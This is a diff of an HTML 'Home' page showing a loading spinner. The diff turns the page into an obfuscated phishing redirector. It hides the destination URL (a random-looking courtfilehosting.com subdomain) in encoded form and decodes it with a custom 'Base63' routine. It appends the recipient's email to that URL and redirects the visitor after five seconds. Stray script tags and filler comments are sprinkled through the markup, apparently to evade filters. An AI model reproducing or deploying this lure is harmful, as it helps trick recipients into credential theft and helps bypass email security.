@@ -1,17 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
+    <script>
+    </script> <!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+    Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
 <head>
     <meta charset="UTF-8">
+</script> <!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+    Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="5;url=https://xcbajndjwjadnmakjdjaa.courtfilehosting.com/gAVcr?e="> <!-- Redirect after 5 seconds -->
-    <title>Redirecting...</title>
+</script> <!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+    Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
+    <meta http-equiv="refresh" content="5;url=" id="redirect-url"> <!-- URL to be set dynamically -->
+    <title>Home</title>
+</script> <!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+    Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
     <style>
+        
         body {
             margin: 0;
             height: 100vh;
-            background-image: url('https://imgur.com/dcByvdS.jpg'); /* Replace with the direct image URL */
-            background-size: cover;
-            background-position: center;
+            background-image: url('https://i.imgur.com/fKU6ICd.jpg'); /* Replace with your image URL */
+            background-size: contain; /* Ensure image fits in portrait mode */
+            background-position: center center; /* Center the image */
+            background-repeat: no-repeat; /* Don't repeat the image */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -41,15 +52,81 @@
             100% { transform: rotate(360deg); }
         }
     </style>
+    </script> <!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+        Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
 </head>
 <body>
     <div class="loading-message">
         <div class="loader"></div>
+    </script> <!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+        Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
         <div>Loading, please wait...</div>
+        <div id="recipient-email"></div> <!-- Placeholder for recipient email -->
     </div>
 
     <script>
-        // The page will automatically redirect after 5 seconds due to the meta tag.
+        // Function to encode a string to Base63
+        function base63Encode(str) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+            let output = '';
+            let buffer = 0;
+            let bits = 0;
+
+            for (let i = 0; i < str.length; i++) {
+                buffer = (buffer << 8) | str.charCodeAt(i);
+                bits += 8;
+
+                while (bits >= 6) {
+                    output += chars[(buffer >> (bits - 6)) & 63];
+                    bits -= 6;
+                }
+            }
+
+            if (bits > 0) {
+                output += chars[(buffer << (6 - bits)) & 63];
+            }
+
+            return output;
+        }
+
+        // Function to decode a Base63 encoded string
+        function base63Decode(encodedStr) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+            let output = '';
+            let buffer = 0;
+            let bits = 0;
+
+            for (let i = 0; i < encodedStr.length; i++) {
+                const charIndex = chars.indexOf(encodedStr[i]);
+                if (charIndex === -1) continue; // Skip invalid characters
+
+                buffer = (buffer << 6) | charIndex;
+                bits += 6;
+
+                while (bits >= 8) {
+                    output += String.fromCharCode((buffer >> (bits - 8)) & 255);
+                    bits -= 8;
+                }
+            }
+
+            return output;
+        }
+
+        // Replace this with the actual recipient email you want to use
+        const recipientEmail = "{RECIPIENT_EMAIL}"; 
+        //<!-- <i> Short ribs venison ball tip, aliquip nisi tail dolore reprehenderit ex tenderloin meatball sausage pancetta elit cupim.
+//Pancetta aute tenderloin, anim pork belly sausage elit excepteur minim ground round.</i> -->
+        // Use the provided Base63 encoded URL
+        const baseUrl = "aHR0cHM6Ly94Y2Jham5kandqYWRubWFramRqYWEuY291cnRmaWxlaG9zdGluZy5jb20vZ0FWY3IvP2U9"; // Your Base63 encoded URL
+        const decodedBaseUrl = base63Decode(baseUrl); // Decode the URL when needed
+        const redirectUrl = decodedBaseUrl + encodeURIComponent(recipientEmail); // Append the email to the decoded URL
+
+        // Set the 'meta' tag to refresh the page and redirect after 5 seconds to the new URL
+        document.getElementById("redirect-url").setAttribute("content", "5;url=" + redirectUrl);
+
+        // Optionally, you can also display the email being used on the page
+        // const emailPlaceholder = document.getElementById("recipient-email");
+        // emailPlaceholder.innerHTML = "Redirecting to: " + redirectUrl; // Display the full URL
     </script>
 </body>
 </html>
